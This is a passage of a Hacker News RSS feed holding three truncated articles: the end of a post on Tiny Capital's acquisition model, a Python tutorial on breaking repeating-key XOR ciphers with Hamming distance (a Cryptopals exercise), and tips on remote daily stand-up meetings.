Zealand company?</p><ul data-rte-list="default"><li><p>It is in the middle of nowhere, nobody is paying attention to it, but it is quietly growing. It is not at risk of nuclear war.&nbsp;</p></li><li><p>It is self-sufficient and thriving. It’s food &amp; energy independent. A "safe" business isn't beholden to benevolent gatekeepers like Google or Facebook to reach their customer.&nbsp;</p></li></ul><p>Andrew is always worried about staying power.&nbsp;</p><p>An example of one of his New Zealand business is Dribbble:</p><ul data-rte-list="default"><li><p>Top 1,000 site on the internet&nbsp;</p></li><li><p>A huge community of designers</p></li><li><p>Profitable</p></li><li><p>Few competitors. Big companies are not trying to kill it or compete.&nbsp;</p></li><li><p>Not dependent on Facebook or Google for traffic. People type Dribbble.com into the address bar to visit.&nbsp;</p></li></ul><p><strong>Types of businesses Tiny has bought/started?</strong></p><p>I don’t know if this is by design, but it seems like Andrew has progressed from services to tools/products to platforms/communities to digital marketplaces.&nbsp;</p><ul data-rte-list="default"><li><p>Agencies: MetaLab (design agency), Double Up (podcast growth agency), 8020 (no-code agency)</p></li><li><p>SaaS tools:&nbsp;<a href="https://www.getflow.com/">Flow</a>&nbsp;(product management), Castro (podcast player), Supercast (podcast subscriptions)</p></li><li><p>Products: Caramba</p></li><li><p>Communities: Dribbble&nbsp;</p></li><li><p>Media: Designer News, RideHome (podcast network)</p></li><li><p>Job Boards:&nbsp;<a href="https://weworkremotely.com/">We Work Remotely</a></p></li><li><p>Digital goods marketplaces: Creative Market, Pixel Union</p></li></ul><p><strong>How Tiny companies operate?</strong></p><p>Tiny companies have fewer information responsibilities than typical PE-owned companies. There are no formal board meetings for example.&nbsp;</p><p>Once a month companies send Tiny a finance-only update with the P&amp;L, balance sheet, and KPIs. No operational info is included.&nbsp;</p><p>Once a quarter companies send Tiny a SWOT (strengths, weaknesses, opportunities, and threats) analysis.&nbsp;</p><p>Companies contact Tiny ASAP for emergencies, major news, or decisions.&nbsp;</p><p>Some CEOs will go 6 months or more without speaking with Andrew.&nbsp;</p><p><strong>How Tiny launches new businesses?</strong></p><p>Tiny’s primary business is buying majority stakes in businesses, not starting them. For a while Andrew would start a new business in any niche he was interested in. He tries to avoid that now and thinks it’s a lot better to buy something that is already good.</p><p>When Andrew does start a new business now, he delegates almost all aspects of it. He recently said he only spent something like 4 hours on each of the new businesses he has launched.&nbsp;</p><p>Andrew will pay for all the work to be done and the investment will form his stake in the business. He will find a CEO to run the business and pay the new CEOs a month or two of salaries to get things going. Then he’ll help with intros, but otherwise, he’ll be hands-off. All in he said it takes $10-50k to get off the ground with a great operator.</p><p><strong>Why do Founders sell to Tiny?</strong></p><p>Tiny is positioned as the good guys of private equity. The Berkshire Hathway of internet businesses.</p><p>They have become known for doing simple acquisitions. Andrew didn’t like the traditional acquisition process: long due diligence, and renegotiation of terms. Warren Buffet does deals in seven days and those are larger, more complex businesses. Smaller deals should be even quicker.</p><p>A challenge with this model is that it is difficult to acquire tech companies at reasonable prices. Acquiring boring traditional businesses is easier because the valuations are so much lower than tech companies. To successfully use this approach you need discipline around what you’re willing to pay for a business and a reputation for being easy to work with. Andrew gets deals by being a nice guy and offering a good home for businesses to live on. Contrast this with the typical PE approach of dramatically cutting costs (ie firing everyone) and squeezing as much profit out as possible. Some founders are looking more for freedom and an easy process than maximizing their financial outcome. </p><p>These smaller PE opportunities are underserved relative to the typical VC businesses. The lifestyle businesses that VC shuns are Andrew’s ideal companies. He is fishing in a less crowded pond. </p><p>Andrew will occasionally pay 10x for an amazing business, but that is rare.&nbsp;</p><p><strong>What happens to businesses after the sale?&nbsp;</strong></p><p>For the employees, it is business as usual for the most part. The goal is for the employees to not even notice.&nbsp; </p><p>The biggest difference is that Tiny becomes the bank. Cash is kept in the company based on historical working capital needs and any extra goes to the head office for new acquisitions.&nbsp; </p><p>Often Tiny buys product or designer-led startups that have grown organically. They will put standard best-practice marketing and sales processes in place and sometimes raise prices. Each company has its own CEO with a few exceptions like all job boards (5+) are under one CEO.&nbsp; </p><p>Tiny has a preference for remote companies where they can hire more affordably. Andrew estimates the cost of running a business in Canada can be 60-65% the cost of in California. Struggling American companies with inflated cost structures can reduce costs by moving to Canada. Canadian arbitrage includes lower salaries, not needing to pay medical benefits, SRED, and cheaper currency.</p><p><strong>Who runs the business after a sale?&nbsp;</strong></p><p>Often Andrew is buying from bootstrapped founders that have been at it for 5-10 years and want to move on.</p><p>Finding great people to run these companies is one of the hardest aspects of this model.&nbsp;</p><p>Andrew deals with this by paying up and hiring CEOs that have managed similar businesses at larger scales already before instead of trying to find underpriced less-experienced talent.&nbsp;</p><p>Months before closing on a deal Andrew works to identify opportunities for the business and a new leader to come in.&nbsp;</p><p>He finds these new CEOs through his existing CEOs by asking “we’re about to buy a business who’s the smartest person you know in the space."</p><p><strong>What does the operating company and Andrew do day-to-day?</strong></p><blockquote><p><em>“Entrepreneurship is just delegation”&nbsp;</em></p><p><em>-Andrew Wilkinson</em></p></blockquote><p>Andrew spends time looking for new deals and looking at their existing portfolio and thinking "how they could get fucked”.&nbsp;</p><p>Andrew says his strengths are:</p><ul data-rte-list="default"><li><p>Laser focused on problems for a short period of time. Moves fast.&nbsp;</p></li><li><p>Very good at 0 to 1. Burns bright for 15 days.&nbsp;</p></li><li><p>Inch deep and a mile wide</p></li><li><p>Not good at execution or day to day details</p></li></ul><p>Being comfortable with delegation is key to this model. Andrew is the owner, not the CEO. The owner can’t constantly be delegating what can or can’t be done or the CEO grows resentful. Some comfort with decisions being made that you don’t agree with comes with the territory. Large decisions that require more capital than usual are a discussion.&nbsp;</p><p><strong>How connected are businesses in the holding company?</strong></p><p>Tiny companies are not at all connected. They each operate independently.&nbsp;</p><p>CEOs will take calls and give advice on best practices, but nothing beyond small favors. Real work gets paid for. Tiny pays all companies for the work they do for the holding company and all work between companies is paid at the full rate.&nbsp;</p><p>Synergies are appealing, but they generally just make the CEOs resentful so they are avoided entirely.&nbsp;</p><p><strong>How much debt do they use?</strong></p><p>Tiny uses little debt for acquisitions (less than Berkshire Hathaway) and they like to pay off debt within 6 months. Debt comes from&nbsp;<a href="https://en.wikipedia.org/wiki/Business_Development_Bank_of_Canada"><strong>BDB of Canada</strong></a>, or traditional banks.</p><p><em>If you know of anything I should add to this please reach …</em></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://colinkeeley.com/blog/andrew-wilkinson-tiny-capital-operating-manual">https://colinkeeley.com/blog/andrew-wilkinson-tiny-capital-operating-manual</a></em></p>]]>
            </description>
            <link>https://colinkeeley.com/blog/andrew-wilkinson-tiny-capital-operating-manual</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739381</guid>
            <pubDate>Sun, 05 Jul 2020 15:26:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deciphering Repeated-Key XOR Ciphertexts Using Hamming Distance]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739362">thread link</a>) | @arpitbbhayani
<br/>
July 5, 2020 | https://arpitbhayani.me/blogs/decipher-repeated-key-xor?ref=hn | <a href="https://web.archive.org/web/*/https://arpitbhayani.me/blogs/decipher-repeated-key-xor?ref=hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Encryption is a process of encoding messages such that it can only be read and understood by the intended parties. The process of extracting the original message from an encrypted one is called Decryption. Encryption usually scrambles the original message using a key, called the encryption key, that the involved parties agree on.</p>
<p>In the previous essay, we went through the <a href="https://arpitbhayani.me/blogs/decipher-single-xor">Single-byte XOR cipher</a> and found a way to decipher it without having any knowledge of the encryption key. In this essay, we find how to break a <a href="https://en.wikipedia.org/wiki/XOR_cipher">Repeating-key XOR cipher</a> with variable key length. The problem statement, defined above, is based on <a href="https://cryptopals.com/sets/1/challenges/6">Cryptopals Set 1 Challenge 6</a>.</p>

<p>The Repeating-key XOR cipher algorithm works with an encryption key with no constraint on its length, which makes it much stronger than a Single-byte XOR Cipher, where the encryption key length was restricted to a single byte.</p>
<h2>Encryption</h2>
<p>A plain text is encrypted using an encryption key by performing a bitwise <a href="https://en.wikipedia.org/wiki/Exclusive_or">XOR</a> operation on every character. The encryption key is repeated until it XORs every single character of the plain text and the resultant stream of bytes is again translated back as characters and sent to the other party. These encrypted bytes need not be among the usual printable characters and should ideally be interpreted as a stream of bytes. Following is the python-based implementation of this encryption process.</p>
<pre><code><span><span>def</span> <span>repeating_key_xor</span><span>(text: bytes, key: bytes)</span> -&gt; bytes:</span>
    <span>"""Given a plain text `text` as bytes and an encryption key `key`
    as bytes, the function encrypts the text by performing
    XOR of all the bytes and the `key` (in repeated manner) and returns
    the resultant XORed byte stream.
    """</span>
    
    
    
    repetitions = <span>1</span> + (len(text) // len(key))
    key = key * repetitions
    key = key[:len(text)]

    
    <span>return</span> bytes([b ^ k <span>for</span> b, k <span>in</span> zip(text, key)])
</code></pre>
<p>As an example, we encrypt the plain text - <code>secretattack</code> - with encryption key <code>$^!</code> and as per the algorithm, we first repeat the encryption key until it matches the length of the plain text and then XOR it against the plain text. The illustration below shows the entire encryption process.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/85919742-d1520600-b88b-11ea-8d71-aa36c58dc48a.png" alt="https://user-images.githubusercontent.com/4745789/85919742-d1520600-b88b-11ea-8d71-aa36c58dc48a.png"></p>
<p>For the first character in plain text - <code>s</code> - the byte i.e. ASCII value is <code>115</code> which when XORed with <code>$</code> results in <code>87</code> whose character equivalent is <code>W</code>, similarly for the second character <code>e</code> the encrypted byte is <code>;</code>, for <code>c</code> it is <code>B</code>, for the fourth character <code>r</code>, since the key repeats, the XOR is taken with <code>$</code> to get <code>V</code> and the process continues. The resultant encrypted text using repeated-key XOR on the plain text <code>secretattack</code> with key <code>$^!</code> is <code>W;BV;UE*UE=J</code>.</p>
<h2>Decryption</h2>
<p>Decryption is a process of extracting the original message from the encrypted ciphertext given the encryption key. XOR has a <a href="https://brainly.in/question/3038497">property</a> - if <code>a = b ^ c</code> then <code>b = a ^ c</code>, hence the decryption process is exactly the same as the encryption i.e. we first repeat the encryption key till it matches the length and then perform bitwise XOR with the ciphertext - the resultant bytes stream will be the original message.</p>
<p>Since encryption and decryption both have an exact same implementation - we pass the ciphertext to the function <code>repeating_key_xor</code>, defined above, to get the original message back.</p>
<pre><code><span>&gt;&gt;&gt; </span>repeating_key_xor(<span>b'W;BV;UE*UE=J'</span>, <span>b'$^!'</span>)
<span>b'secretattack'</span>
</code></pre>

<p>Things become really interesting when, given the encryption algorithm, we have to recover the original message from the ciphertext with no knowledge of the encryption key. Just like solving any other problem, the crux of deciphering the message encrypted using repeated-key XOR cipher is to break it down into manageable sub-problems and tackle them independently. We break this deciphering problem into the following two sub-problems:</p>
<ul>
<li>Finding the length of the Encryption Key</li>
<li>Bruteforce with all possible keys and finding the "most English" plain text</li>
</ul>
<h2>Finding the length of the Encryption Key</h2>
<p>In order to recover the original text from the cipher, we first find the length of the encryption key used and then apply brute force with all possible keys of the estimated length and deduce the plain text. Finding the length of the Encryption key makes the deciphering process quicker as it eliminates a lot of false keys and thus reducing the overall effort required during the brute force. In order to find the length of the Encryption Key, we need to have a better understanding of a seemingly unrelated topic - Hamming Distance.</p>
<h3>Hamming Distance</h3>
<p>Hamming distance between two bytes is the number of positions at which the corresponding bits differ. For a stream of bytes, of equal lengths, it is the sum of Hamming Distances between the corresponding bytes. Finding differences between bits can be efficiently done using bitwise XOR operation as the operation yields <code>0</code> when both the bits are the same and <code>1</code> when they differ. So for computing Hamming Distance between two bytes we XOR the bytes and count the number of <code>1</code> in its binary representation.</p>
<pre><code><span><span>def</span> <span>hamming_distance_bytes</span><span>(text1: bytes, text2: bytes)</span> -&gt; int:</span>
    <span>"""Given two stream of bytes, the function returns the Hamming Distance
    between the two.
    Note: If the two texts have unequal lengths, the hamming distance is
    computed only till one of the text exhausts, other bytes are not iterated.
    """</span>
    dist = <span>0</span>
    <span>for</span> byte1, byte2 <span>in</span> zip(text1, text2):
        dist += bin(byte1 ^ byte2).count(<span>'1'</span>)
    <span>return</span> dist

<span>&gt;&gt;&gt; </span>hamming_distance_bytes(<span>b'ab'</span>, <span>b'zb'</span>)
<span>4</span>
</code></pre>
<p>In the example above, we find that the hamming distance between two bytestreams <code>ab</code> and <code>zb</code> is <code>4</code>, which implies that the byte streams <code>ab</code> and <code>zb</code> differ at <code>4</code> different bits in their binary representations.</p>
<h3>Hamming Score</h3>
<p>Hamming distance is an absolute measure, hence in order to compare hamming distance across byte streams of varying lengths, it has to be normalized with the number of pairs of bits compared. We name this measure - Hamming Score - which thus is defined as the Hamming Distance per unit bit-pair. In python, Hamming Score is implemented as:</p>
<pre><code><span><span>def</span> <span>hamming_score_bytes</span><span>(text1: bytes, text2: bytes)</span> -&gt; float:</span>
    <span>"""Given two streams of bytes, the function computes a normalized Hamming
    Score based on the Hamming distance.
    Normalization is done by dividing the Hamming Distance by the number of bits
    present in the shorter text.
    """</span>
    <span>return</span> hamming_distance_bytes(text1, text2) / (<span>8</span> * min(len(text1), len(text2)))

<span>&gt;&gt;&gt; </span>hamming_score_bytes(<span>b'ab'</span>, <span>b'zb'</span>)
<span>0.25</span>
</code></pre>
<h3>What can we infer through Hamming Distance?</h3>
<p>Hamming Distance is an interesting measure; it effectively tells us the minimum number of bit flips required to convert one bytestream into another. It also implies that (on average) if the numerical values of two bytestreams are closer then their Hamming Distance and Hamming Score will be lower i.e it would take fewer bit flips to convert one into another.</p>
<p>This is evident from the fact that the average Hamming distance between any two bytes <code>[0-256)</code> picked at random is <code>3.9999</code> while that of any two lowercased English characters <code>[97, 122]</code> is just <code>2.45</code>. Similar ratios are observed for Hamming Score where <code>0.4999</code> is of the former while <code>0.3072</code> is of the later.</p>
<p>This inference comes in handy when we want to find out the length of Encryption Key in Repeating-key XOR Cipher as illustrated in the section below.</p>
<h3>Formal definition of encryption and decryption processes</h3>
<p>Say if <code>p</code> denotes the plaintext, <code>k</code> denotes the encryption key which is repeated to match the length of the plain text, and <code>c</code> denotes the ciphertext, we could define encryption and decryption processes as</p>
<pre><code>encryption: c[i] = p[i] XOR k[i]   <span>for</span> i <span>in</span> [<span>0</span>, len(c))
decryption: p[i] = c[i] XOR k[i]   <span>for</span> i <span>in</span> [<span>0</span>, len(p))
</code></pre>
<p>The above definitions, along with the rules of XOR operations, implying that if we XOR two bytes of the ciphertext, encrypted (XORed) using the same byte of the encryption key, we are effectively XORing the corresponding bytes of the plain text. If <code>k'</code> is the byte of the encryption key <code>k</code> which was used to encrypt (XOR) the bytes <code>p[i]</code> and <code>p[j]</code> of the plain text to generate <code>c[i]</code> and <code>c[j]</code> of the ciphertext, we could derive the following relation</p>
<pre><code># k' <span>is</span> the common byte <span>of</span> the key i.e. k' = k = k

c XOR c = (p XOR k') XOR (p XOR k')
              = p XOR k' XOR k' XOR p
              = p XOR 0 XOR p
              = p XOR p
</code></pre>
<p>The above relation, <code>c[i] XOR c[j]</code> equal to <code>p[i] XOR p[j]</code>, holds true only because both the bytes were XORed with the same byte <code>k'</code> of the encryption key; which in fact helped reduce the expression. If the byte from the encryption key which was used to XOR the pain texts were different then the relation was irreducible and we could not have possibly setup this relation.</p>
<h3>Chunking of ciphertext</h3>
<p>Chunking is the process where the ciphertext is split into smaller chunks (segments) of almost equal lengths. For example, chunking the ciphertext <code>W;BV;UE*UE=J</code> for chunk length <code>4</code> would create <code>3</code> chunks <code>W;BV</code>, <code>;UE*</code> and <code>UE=J</code>. The illustration below shows the chunks that would be formed for <code>W;BV;UE*UE=J</code> with chunks lengths varying from 2 to 6.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/86434084-24a7d680-bd1a-11ea-8346-aad7b42bab1c.png" alt="https://user-images.githubusercontent.com/4745789/86434084-24a7d680-bd1a-11ea-8346-aad7b42bab1c.png"></p>
<h3>XOR of the chunks</h3>
<p>Something very interesting happens when we compute the Average Hamming Score for all possible chunk lengths. If we consider the ciphertext <code>b'W;BV;UE*UE=J</code> and we chunk it with lengths varying from 2 to 6, we get the following distribution for the Average Hamming Score for each of the chunk length.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/86473899-6149f100-bd5f-11ea-908a-d4adabff1cf0.png" alt="https://user-images.githubusercontent.com/4745789/86473899-6149f100-bd5f-11ea-908a-d4adabff1cf0.png"></p>
<p>From the distribution above it is evident that the score was minimum at chunk length equalling <code>3</code>, which actually was the length of the Encryption Key used on the plain text. Is this mere coincidence or are we onto something?</p>
<p>When chunk length is equal to the length of the encryption key, the XOR operation on any two chunks will reduce the expression to XOR of the corresponding plain texts (as seen above), because there will be a perfect alignment of bytes from ciphertext and bytes from the keys i.e every <code>i</code>th byte from both the chunks would have been XORed with <code>i</code>th byte from the encryption key.</p>
<p>We have established that for chunk length equal to the length of the encryption key <code>c[i] XOR c[j]</code> …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://arpitbhayani.me/blogs/decipher-repeated-key-xor?ref=hn">https://arpitbhayani.me/blogs/decipher-repeated-key-xor?ref=hn</a></em></p>]]>
            </description>
            <link>https://arpitbhayani.me/blogs/decipher-repeated-key-xor?ref=hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739362</guid>
            <pubDate>Sun, 05 Jul 2020 15:24:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ideas to make daily stand-up meetings engaging in remote work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739264">thread link</a>) | @notatechie
<br/>
July 5, 2020 | https://www.peoplebox.ai/blog/how-to-use-daily-standup-meetings-for-remote-employee-engagement/ | <a href="https://web.archive.org/web/*/https://www.peoplebox.ai/blog/how-to-use-daily-standup-meetings-for-remote-employee-engagement/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-content-container">

        	<div id="post-content">
			
            	   <p><img src="https://www.peoplebox.ai/wp-content/uploads/2020/06/MS-teams.jpg" alt="daily standup meetings for remote employee engagement" width="840" height="472" srcset="https://www.peoplebox.ai/wp-content/uploads/2020/06/MS-teams.jpg 840w, https://www.peoplebox.ai/wp-content/uploads/2020/06/MS-teams-300x169.jpg 300w, https://www.peoplebox.ai/wp-content/uploads/2020/06/MS-teams-768x432.jpg 768w" sizes="(max-width: 840px) 100vw, 840px" data-srcset="https://www.peoplebox.ai/wp-content/uploads/2020/06/MS-teams.jpg 840w, https://www.peoplebox.ai/wp-content/uploads/2020/06/MS-teams-300x169.jpg 300w, https://www.peoplebox.ai/wp-content/uploads/2020/06/MS-teams-768x432.jpg 768w" data-src="https://www.peoplebox.ai/wp-content/uploads/2020/06/MS-teams.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
<p>Source – Microsoft teams</p>
<p><span><span>D</span>aily standup meetings are a routine part of a manager’s life.&nbsp;</span><span>They serve as an axis to keep the team well-connected and in touch with each other’s role in achieving the common goal.&nbsp;</span></p>
<p><span>In the wake of COVID-19 pandemic, the world continues to embrace remote work more and more.</span></p>
<p><span>Consequently, a manager has to reinvent her strategies with a </span><a href="https://www.peoplebox.ai/blog/remote-first-vs-remote-friendly-companies-whats-the-difference/"><span>remote-friendly approach</span></a><span> and find ways to maintain high </span><a href="https://www.peoplebox.ai/blog/how-important-is-remote-employee-engagement-to-team-productivity/"><span>remote employee engagement</span></a><span>.</span></p>

<div>
<p><strong>Some of the biggest problems a manager with remote employees face is eliminating the communication gap and daily standup meetings can be an effective way to deal with it.</strong></p>
</div>



<p><span>A standup meeting can also help a manager in improving remote employee engagement and increasing productivity besides removing barriers to communication.</span></p>
<p><span>All you need to do is follow certain tips to ensure that you derive maximum value from the time you spend in your daily standup meetings.</span></p>
<p><span>In this article, we set out to explore what exactly is a daily standup meeting, how it can make a difference to your remote team and what you can do to make it more effective and engaging.&nbsp;</span></p>
<p><span>So, let’s begin.</span></p>
<h2><b>What is a daily standup meeting?</b></h2>
<p><span>In an agile team, a daily standup meeting is where the team gets together every day for a specific time to discuss the daily progress and the plan to be followed.&nbsp;</span></p>
<p><span>As the name suggests, people often do not sit down in this meeting to avoid long discussion, stress on the urgency and keep the meeting straight-to-the-point and time-bound.</span></p>
<p><span>It is supposed to last for 15 minutes and addresses three main questions&nbsp;</span></p>
<ul>
<li><span>What has been achieved?</span></li>
<li><span>What remains to be done?</span></li>
<li><span>Are there any issues that are hampering the completion of a task?&nbsp;</span></li>
</ul>
<h2><b>Why are daily-standup meetings vital in remote work?</b></h2>
<p><span>The purpose of a daily standup meeting is to keep everyone on the same page which becomes even more important when you are managing a remote team.&nbsp;</span></p>
<p><span>In a regular office scenario, team members can walk up to each other to clear doubts and are&nbsp; aware of the real-time updates which cannot happen in a remote work setup.&nbsp;</span></p>
<p><span>Hence, a standup meeting serves as a tool to address issues collectively and improve transparency amongst team members.&nbsp;</span></p>
<p><span>A team with remote employees, however,&nbsp; may have members distributed over different geographical locations.&nbsp;</span></p>
<p><span>The absence of physical proximity makes communication and coordination more complex with remote employees.</span></p>
<p><span>Thus, the role of standup meetings expand and become more essential.</span></p>

<div>
<p><strong>In a remote work environment, standup meetings become a focal point of bringing the whole team together daily and discuss action items, strategies and blockers on a common platform for better synergy. </strong></p>
</div>

<p><span>Mostly, a standup meeting is the only time when the remote employees are present with other team members in the same capacity.</span></p>
<p><span>It keeps them in the loop and more connected.</span></p>
<h2><b>Difference between daily standup and status update meeting</b></h2>
<p><span>Their difference lies in the question they aim to answer.&nbsp;</span></p>
<p><span>In a status update meeting, the main concern is – “</span><b><i>How much work has been completed?”</i></b></p>
<p><span>But, in a daily standup meeting, the core theme is – “</span><b><i>What is your action plan for the day?”</i></b></p>

<div>
<p><strong>A status update meeting focuses on the progress of the deliverables whereas a daily standup meeting aims to improve planning and achieve maximum team collaboration. </strong></p>
</div>


<p><span>A status update meeting helps a manager in knowing what an individual employee has completed up to a point of time.&nbsp;</span></p>
<p><span>A daily standup meeting, on the other hand, concentrates upon how a team can achieve its goals together and the roadblocks the team is focusing on.&nbsp;</span></p>
<p><span>A status update meeting wants to know the results whereas a daily standup meeting aims to understand the future course of action.&nbsp;</span></p>
<h2><b>Benefits of daily standup meetings for remote employees</b></h2>
<p><span>Besides the advantages of flexibility and freedom, remote work also ushers in a set of unique challenges.</span></p>
<p><span>Lack of coordination and miscommunication happen to be some of the problems that remote employees face.</span></p>
<p><span>But, they’re only the tip of the iceberg.</span></p>
<p><span>There’re many intricate issues that a remote employee may face which are completely different from that of a regular office-going employee.</span></p>
<p><span>A daily standup meeting can help a manager streamline a lot of them. Here’s how –&nbsp;</span></p>
<h3><span><span>1 </span></span><b>Helps in building team rapport</b></h3>
<p><b><span>One of the major challenges of remote work is lack of human connection. </span></b></p>
<p><b><span>The lack of personal connection and acquaintance may cause major obstacles and hamper interpersonal coordination.</span></b></p>

<div>
<p><strong>A daily standup meeting allows the entire team to be present at the same time on the same platform even if it’s virtual. </strong></p>
</div>


<p><span>Your remote employees will get a chance to interact with other team members and learn more about them.</span></p>
<h3><span><span>2 </span></span><b>Removes roadblocks</b></h3>
<p><b><span>For a remote employee, their manager is their immediate and often the first&nbsp; point of contact for every issue they may be facing.</span></b></p>
<p>Some of the problems can easily be solved with the help of a fellow team member instead of reaching out to you directly.</p>
<p><span>However, remote employees are not acquainted enough with their teammates and are reluctant to contact them.</span></p>

<div>
<p><strong>A daily standup gives them a chance to get to know the entire team and helps them get familiar with other employees’ personalities and skills. </strong></p>
</div>


<p><span>It also eases their hesitation in approaching others and they may even solve many problems with their team member’s help rather than approaching you for every single issue.</span></p>
<h3><span><span>3 </span></span><b>Encourages knowledge transfer</b></h3>
<p><b><span>Your remote employees work independently and depend upon their knowledge, research and your guidance for learning and execution of their task.&nbsp;</span></b></p>
<p><span>In a shared workspace,&nbsp; team members tend to consult each other and rely on each other’s expertise to get things done.</span></p>
<p><span>There will always be an Alex who’s great at excel or a Tina who can make a presentation look better with a few tweaks.&nbsp;</span></p>
<p><span>A remote employee might not get the opportunity to know either Alex or Tina without a daily standup meeting.</span></p>

<div>
<p><strong>When every employee shares their issues on a common platform, they may be able to find help or suggestions from another team member. </strong></p>
</div>


<p><span>This exchange will encourage the transfer of valuable information and strengthen your team.&nbsp;</span></p>
<h3><span><span>4 </span></span><b>Improved coordination</b></h3>
<p><b><span>A daily standup meeting will ensure that all your direct reports are aware of the progress and the upcoming action plan.&nbsp;</span></b></p>
<p><span>This way everyone is aware of the responsibilities and there’s no scope of miscommunication or confusion.</span></p>
<p><span>Increased transparency and better communication lead to maximum coordination and saving of time.&nbsp;</span></p>
<h3><span><span>5 </span></span><b>Instill a recognition of shared goals</b></h3>
<p><b><span>Often, remote employees become isolated and estranged from the organizational goals.&nbsp;</span></b></p>
<p><span>They know that they’re expected to deliver 5 articles, or deploy the code, or provide 5 designs by the end of the period.&nbsp;</span></p>
<p><span>However, they don’t know how it contributes to the company and how it affects the overall process.</span></p>
<p><span>In a daily standup meeting, they get a complete view of the bigger picture and where they stand in it.&nbsp;</span></p>
<p><span>It instils a sense of belonging and helps them realize where they fit in the puzzle.</span></p>
<p><span>This knowledge of their work’s importance will </span><a href="https://www.peoplebox.ai/blog/how-to-boost-employee-morale-through-one-on-one-meetings/"><span>boost their morale</span></a><span> and will make them feel included.&nbsp;</span></p>
<h2><b>How can daily stand-up meetings help in remote employee engagement?</b></h2>
<p><span>Due to the precautions being taken up after the Coronavirus outbreak, the number of remote employees will rise inevitably.</span></p>
<p><span>A </span><a href="https://www.gartner.com/en/newsroom/press-releases/2020-04-03-gartner-cfo-surey-reveals-74-percent-of-organizations-to-shift-some-employees-to-remote-work-permanently2"><span>research by Gartner</span></a><span> reveals that 74% of CFOs are planning to shift a considerable number of their employees to remote work permanently.</span></p>

<p><img src="https://www.peoplebox.ai/wp-content/uploads/2020/06/Gartner-remote-work.png" alt="daily standup and status update meeting" width="744" height="311" srcset="https://www.peoplebox.ai/wp-content/uploads/2020/06/Gartner-remote-work.png 744w, https://www.peoplebox.ai/wp-content/uploads/2020/06/Gartner-remote-work-300x125.png 300w" sizes="(max-width: 744px) 100vw, 744px" data-srcset="https://www.peoplebox.ai/wp-content/uploads/2020/06/Gartner-remote-work.png 744w, https://www.peoplebox.ai/wp-content/uploads/2020/06/Gartner-remote-work-300x125.png 300w" data-src="https://www.peoplebox.ai/wp-content/uploads/2020/06/Gartner-remote-work.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>

<p><span>While this move opens up new avenues to retain and hire diverse talent, it also poses the challenge of re-imagining the strategies to keep remote employees engaged and well-coordinated.</span></p>
<p><span>In a traditional workplace, daily standup meetings have been playing the role of channelizing better management among the team.&nbsp;</span></p>
<p><span>As a manager, you already know the ropes of conducting these meetings in a way that they are productive, engaging and interesting.&nbsp;</span></p>
<p><span>With the shift in workplace dynamics, you will have to accommodate remote employees and ensure that they are well-represented in the meeting.&nbsp;</span></p>
<p><span>Here’re a few tips that can help you out.&nbsp;</span></p>
<h2><b>Tips for productive &amp; engaging daily standup meetings for remote teams</b></h2>
<h3><span><span>1 </span></span><b>Decide a fixed time</b></h3>
<p><b><span>The reason why we have a standup meeting is to inculcate a routine of accountability, discipline and concrete planning in our team.&nbsp;</span></b></p>
<p><span>And, this is why you must decide upon a fixed time to conduct it every day.</span></p>
<p><span>If you change the time often, it will lead to confusion, delay and late arrival or absence of many employees.&nbsp;</span></p>
<p><span>With fixed time, your entire team will become habitual and will embrace it in their daily routine.&nbsp;</span></p>
<p><span>Ideally, a daily standup meeting should happen either at the beginning or the end of the day.</span></p>

<div>
<p><strong>A standup meeting at the start of the workday helps in planning the day while the one at the end helps in preparing your employees for what to expect the next day. </strong></p>
</div>


<p><span>In case, your remote employees are working from another timezone, you will need to ensure that they’re comfortable with the time.&nbsp;</span></p>
<p><span>Remember, a daily standup meeting will garner positive results only if all your team members are present; including your remote employees.&nbsp;</span></p>
<p><b><img alt="" width="20" height="28" data-src="https://www.peoplebox.ai/wp-content/uploads/2019/12/Untitled.png" src="https://www.peoplebox.ai/wp-content/uploads/2019/12/Untitled.png"> Pro tip: </b><span>Send out a calendar invite which includes a link to the virtual meeting and use the same link daily. </span></p>
<p><span>This will help all your direct reports in finding the meeting link every day without having to contact you or someone else.</span></p>
<h3><span><span>2 </span></span><b>Decide upon tech tools</b></h3>
<p><b><span>Now that your team has remote employees, you are more likely to conduct the daily standup meeting virtually.&nbsp;</span></b></p>
<p><span>Thus, it becomes important to have the right </span><a href="https://www.peoplebox.ai/blog/tools-for-effective-remote-one-on-one-meetings/"><span>tech tool</span></a><span>s for your support.</span></p>
<p><span>For a daily standup meeting, you will require the following kind of tools –</span></p>
<ul>
<li><span>A video conferencing tool like Skype or Google meet</span></li>
<li><span>A task management tool to keep a note of all the action items</span></li>
<li><span>An easy-to-use screen sharing mechanism</span></li>
</ul>
<p>Make sure that everyone agrees on the tools decided upon and have no technical difficulties in accessing them.</p>
<p><span>It’s a good idea to have a trial …</span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.peoplebox.ai/blog/how-to-use-daily-standup-meetings-for-remote-employee-engagement/">https://www.peoplebox.ai/blog/how-to-use-daily-standup-meetings-for-remote-employee-engagement/</a></em></p>]]>
            </description>
            <link>https://www.peoplebox.ai/blog/how-to-use-daily-standup-meetings-for-remote-employee-engagement/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739264</guid>
            <pubDate>Sun, 05 Jul 2020 15:13:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Art of Learning for Software Developers]]>
            </title>
            <description>
<![CDATA[
